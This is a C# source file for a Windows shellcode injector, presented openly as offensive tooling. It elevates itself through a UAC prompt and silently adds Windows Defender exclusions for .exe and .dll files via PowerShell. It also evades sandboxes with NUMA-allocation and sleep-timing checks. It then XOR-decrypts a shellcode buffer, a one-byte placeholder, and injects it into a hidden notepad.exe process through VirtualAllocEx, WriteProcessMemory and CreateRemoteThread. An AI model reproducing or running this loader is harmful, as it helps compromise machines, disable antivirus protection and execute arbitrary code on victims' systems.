/* SIMPLE PROCESS INJECTION
description: |
	Injects shellcode into an a newly spawned remote process.
key win32 API calls:
  - kernel32.dll:
    1: 'OpenProcess'
    2: 'VirtualAllocEx (PAGE_EXECUTE_READ_WRITE)'
    3: 'WriteProcessMemory'
    4: 'CreateRemoteThread'
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Security.Principal;
using System.Diagnostics;
using System.ComponentModel;
using System.Reflection;

namespace SimpleProcessInjection
{
    class Program
    {
        public const uint PAGE_EXECUTE_READ_WRITE  = 0x40;
        
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
		[DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
				uint processAccess,
				bool bInheritHandle,
				int processId);

		//https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
				IntPtr hProcess,
				IntPtr lpAddress,
				uint dwSize,
				uint flAllocationType,
				uint flProtect);

		//https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
				IntPtr hProcess,
				IntPtr lpBaseAddress,
				byte[] lpshellcodefer,
				Int32 nSize,
				out IntPtr lpNumberOfBytesWritten);

		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
				IntPtr hProcess, 
				IntPtr lpThreadAttributes, 
				uint dwStackSize, 
				IntPtr lpStartAddress, 
				IntPtr lpParameter, 
				uint dwCreationFlags, 
				out IntPtr lpThreadId);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
		
		private static byte[] xor(byte[] cipher, byte[] key)
		{
			byte[] xored = new byte[cipher.Length];

			for (int i = 0; i < cipher.Length; i++)
			{
				xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
			}

			return xored;
		}
		
        static void Main(string[] args)
        {
			WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {

                // relaunch the application with admin rights
                string fileName = Assembly.GetExecutingAssembly().Location;
                ProcessStartInfo processInfo = new ProcessStartInfo();
                processInfo.Verb = "runas";
                processInfo.FileName = fileName;

                try
                {
                    Process.Start(processInfo);
                }
                catch (Win32Exception){}
                return;


            }
            ProcessStartInfo q = new ProcessStartInfo();
            q.CreateNoWindow = true;
            q.UseShellExecute = false;
            q.RedirectStandardOutput = true;
            q.RedirectStandardError = true;
            q.FileName = @"C:\Windows\system32\cmd.exe";
            q.WorkingDirectory = @"C:\";
            q.Arguments = @"/C powershell.exe Add-MpPreference -ExclusionExtension exe; powershell.exe Add-MpPreference -ExclusionExtension dll;";
            Process processTemp = new Process();
            processTemp.StartInfo = q;
            processTemp.EnableRaisingEvents = true;
            try
            {
                processTemp.Start();
            }
            catch (Exception)
            {
                throw;
            }
			IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
				return;
            }
			
			

			DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
				return;
            }
			
			IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;
            
			// Launches notepad.exe in background
			Process p = new Process();
			p.StartInfo = new ProcessStartInfo("notepad.exe");
			p.StartInfo.WorkingDirectory = @"C:\Windows\System32\";		
			p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			p.Start();
			
            // Get the pid of the notepad process - this can be any process you have the rights to
            int pid = Process.GetProcessesByName("notepad")[0].Id;


            // Get a handle to the explorer process. 0x001F0FFF = PROCESS_ALL access right
            hProcess = OpenProcess(0x001F0FFF, false, pid);


			string key = "ARICAHACKON";

			// This shellcode byte is the encrypted output from encryptor.exe
			byte[] xorshellcode = new byte[1] {0xbd};

			byte[] shellcode;
			shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));


           // Allocate memory in the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint) shellcode.Length, 0x3000, PAGE_EXECUTE_READ_WRITE);

           // Write shellcode[] to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            // Create the remote thread in a suspended state = 0x00000004
			IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out hThread);
			
			//This is for debug. You can comment the below line if you do not need to read all the console messages
			System.Threading.Thread.Sleep(3000);
        }
    }
}
